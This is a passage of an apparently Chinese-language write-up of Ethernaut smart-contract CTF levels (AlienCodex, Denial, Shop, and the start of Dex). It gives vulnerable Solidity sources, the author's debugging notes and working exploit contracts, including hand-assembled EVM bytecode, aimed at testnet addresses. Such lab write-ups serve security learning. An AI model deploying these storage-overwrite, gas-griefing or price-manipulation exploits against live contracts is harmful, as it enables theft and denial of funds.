</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">AlienCodex</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">make_contact</span>() <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">retract</span>() <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">revise</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_content</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">AlienCodex</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">AlienCodex</span>(<span style="color:#ae81ff">0xD722Ca9C6655EBc031Ddb5FCff419d525ef66D13</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">make_contact</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">retract</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">hacker</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes32</span>(<span style="color:#a6e22e">uint</span>(<span style="color:#a6e22e">uint160</span>(<span style="color:#ae81ff">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">=</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">uint</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">uint</span>(<span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">revise</span>(<span style="color:#a6e22e">offset</span>, <span style="color:#a6e22e">hacker</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">pure</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">uint</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">uint</span>(<span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="insights-1">Insights<a hidden class="anchor" aria-hidden="true" href="#insights-1">#</a></h2>
<blockquote>
<p>This level exploits the fact that the EVM doesn&rsquo;t validate an array&rsquo;s ABI-encoded length vs its actual payload.</p>
</blockquote>
<p>这个漏洞我好像没用到&hellip;?</p>
<h1 id="level-20-denial">Level 20. Denial<a hidden class="anchor" aria-hidden="true" href="#level-20-denial">#</a></h1>
<blockquote>
<p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
</blockquote>
<blockquote>
<p>If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level.</p>
</blockquote>
<h2 id="source-14">Source<a hidden class="anchor" aria-hidden="true" href="#source-14">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Denial</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">SafeMath</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">uint256</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">partner</span>; <span style="color:#75715e">// withdrawal partner - pay the gas, split the withdraw
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">constant</span> <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0xA9E</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">timeLastWithdrawn</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mapping</span>(<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">withdrawPartnerBalances</span>; <span style="color:#75715e">// keep track of partners balances
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setWithdrawPartner</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_partner</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">partner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_partner</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// withdraw 1% to recipient and 1% to owner
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">amountToSend</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>.<span style="color:#a6e22e">div</span>(<span style="color:#ae81ff">100</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// perform a call without checking return
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// The recipient can revert, the owner will still get their share
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">call</span>.<span style="color:#a6e22e">value</span>(<span style="color:#a6e22e">amountToSend</span>)(<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">owner</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">amountToSend</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// keep track of last withdrawal time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">timeLastWithdrawn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">now</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">withdrawPartnerBalances</span>[<span style="color:#a6e22e">partner</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">withdrawPartnerBalances</span>[<span style="color:#a6e22e">partner</span>].<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">amountToSend</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// allow deposit of funds
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// convenience function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contractBalance</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-5">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-5">#</a></h2>
<blockquote>
<p>Error handling: Assert, Require, Revert and Exceptions</p>
</blockquote>
<blockquote>
<p>Solidity uses state-reverting exceptions to handle errors. Such an exception undoes all changes made to the state in the current call (and all its sub-calls) and flags an error to the caller.</p>
</blockquote>
<blockquote>
<p>When exceptions happen in a sub-call, they “bubble up” (i.e., exceptions are rethrown) automatically unless they are caught in a try/catch statement. Exceptions to this rule are send and the low-level functions <code>call</code>, <code>delegatecall</code> and <code>staticcall</code>: they return false as their first return value in case of an exception instead of “bubbling up”.</p>
</blockquote>
<p>确实，在合约call的时候revert不会终止调用合约的执行。所以这个是重入？</p>
<h2 id="exp-8">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-8">#</a></h2>
<p>注意fallback要的是payable的，第一次没加就过不了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Denial</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setWithdrawPartner</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_partner</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Partner</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Denial</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Denial</span>(<span style="color:#ae81ff">0xdDea82B42FB095D3eb9fc0f792C15Bb0c82B61de</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">withdraw</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Denial</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Denial</span>(<span style="color:#ae81ff">0xdDea82B42FB095D3eb9fc0f792C15Bb0c82B61de</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Partner</span> <span style="color:#a6e22e">partner</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Partner</span>();
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">setWithdrawPartner</span>(<span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">partner</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-21-shop">Level 21. Shop<a hidden class="anchor" aria-hidden="true" href="#level-21-shop">#</a></h1>
<blockquote>
<p>Сan you get the item from the shop for less than the price asked?</p>
</blockquote>
<h2 id="source-15">Source<a hidden class="anchor" aria-hidden="true" href="#source-15">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Buyer</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">price</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Shop</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">price</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">isSold</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">buy</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Buyer</span> <span style="color:#a6e22e">_buyer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buyer</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_buyer</span>.<span style="color:#a6e22e">price</span>.<span style="color:#a6e22e">gas</span>(<span style="color:#ae81ff">3000</span>)() <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">price</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isSold</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">isSold</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">price</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_buyer</span>.<span style="color:#a6e22e">price</span>.<span style="color:#a6e22e">gas</span>(<span style="color:#ae81ff">3000</span>)();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-6">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-6">#</a></h2>
<p>没看懂什么意思，看了皮卡丘师傅的wp，发现目标是把price改小。3000gas应该没啥影响？</p>
<p>好吧，是有影响的&hellip;修改一次storage(sstore)需要20000gas; sload costs 800 gas.</p>
<p>看了皮卡丘师傅的wp和黄皮书后发现call只需要700gas</p>
<p>有两种revert，我遇到的一直是<code>Warning! Error encountered during contract execution [execution reverted] </code>，所以应该不是gas不够的原因。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691990291/blog/ethernaut/outofgas_cxlkvn.png" alt=""  />
</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691990291/blog/ethernaut/exec_revert_a7ru2k.png" alt=""  />
</p>
<p>真是非常奇怪，在私链上调试是可以的啊。。。</p>
<h2 id="exp-9">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-9">#</a></h2>
<p>这一题看了一天还是不会，发现很多细节导致我一直revert。暂时认为是out-of-gas的原因，存疑。</p>
<p>在jsvm上调试了一下查询isSold的操作是不可控的，包含了一个sload操作，用了1069gas。所以说我自己的代码使用的gas不可以超过2000gas。手写试试。</p>
<p>jsvm hacker: <code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>
jsvm shop  : <code>0xd9145CCE52D386f254917e481eB44e9943F39138</code></p>
<p>jsvm test</p>
<pre tabindex="0"><code>33735B38Da6a701c568545dCfcB03FcB875f56beddC41860485763a6f2ae3a600052600060006004601c600073d9145CCE52D386f254917e481eB44e9943F391385af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3
</code></pre><p>rinkeby hacker: <code>0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</code>
rinkeby shop  : <code>0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A</code></p>
<p>final</p>
<pre tabindex="0"><code>33739B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F1860485763a6f2ae3a600052600060006004601c600073a0379c92AE6533b4C3f82606852E6ACc416DCc3A5af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// address target = 0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd9145CCE52D386f254917e481eB44e9943F39138</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">price</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span>) {
</span></span><span style="display:flex;"><span>        (, <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">isSold</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa0379c92AE6533b4C3f82606852E6ACc416DCc3A</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">hex</span><span style="color:#e6db74">&#39;e852e741&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// require(res == true, &#34;price(): Fail.&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">uint8</span>(<span style="color:#a6e22e">isSold</span>[<span style="color:#ae81ff">0x1f</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">99</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">101</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">res</span>, ) <span style="color:#f92672">=</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeWithSignature</span>(<span style="color:#e6db74">&#34;buy()&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">res</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;attack(): Fail.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">testgas</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">res</span>, ) <span style="color:#f92672">=</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">gas</span><span style="color:#f92672">:</span><span style="color:#ae81ff">30000</span>}(<span style="color:#a6e22e">hex</span><span style="color:#e6db74">&#39;e852e741&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">res</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;testgas(): Fail.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">HackersShellcode</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span><span style="color:#e6db74">&#39;33735B38Da6a701c568545dCfcB03FcB875f56beddC41860485763a6f2ae3a600052600060006004601c600073d9145CCE52D386f254917e481eB44e9943F391385af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assembly</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">shellcode</span>,<span style="color:#ae81ff">0x20</span>),<span style="color:#a6e22e">mload</span>(<span style="color:#a6e22e">shellcode</span>))
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> {
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">HackersShellcodeRinkeby</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span><span style="color:#e6db74">&#39;33739B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F1860485763a6f2ae3a600052600060006004601c600073a0379c92AE6533b4C3f82606852E6ACc416DCc3A5af160006000f35b63e852e741600052602060006004601c6000335af1600051606e57606460005260206000f35b606360005260206000f3&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assembly</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">shellcode</span>,<span style="color:#ae81ff">0x20</span>),<span style="color:#a6e22e">mload</span>(<span style="color:#a6e22e">shellcode</span>))
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>其实我一开始遇到的问题就是gas不足的问题，在函数调用中如果gas不足在etherscan上不会显示out-of-gas，反而是函数调用会以失败的结果返回。</p>
<h1 id="level-22-dex">Level 22. Dex<a hidden class="anchor" aria-hidden="true" href="#level-22-dex">#</a></h1>
<blockquote>
<p>The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.</p>
</blockquote>
<blockquote>
<p>You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.</p>
</blockquote>
<blockquote>
<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &ldquo;bad&rdquo; price of the assets.</p>
</blockquote>
<h2 id="source-16">Source<a hidden class="anchor" aria-hidden="true" href="#source-16">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Dex</span>  {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">SafeMath</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">uint</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">token1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">token2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_token1</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_token2</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">token1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_token1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">token2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_token2</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 两个都是自己指定的token？from token可控 假设amount == 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">swap</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">from</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">to</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">amount</span>) <span style="color:#66d9ef">public</span> {
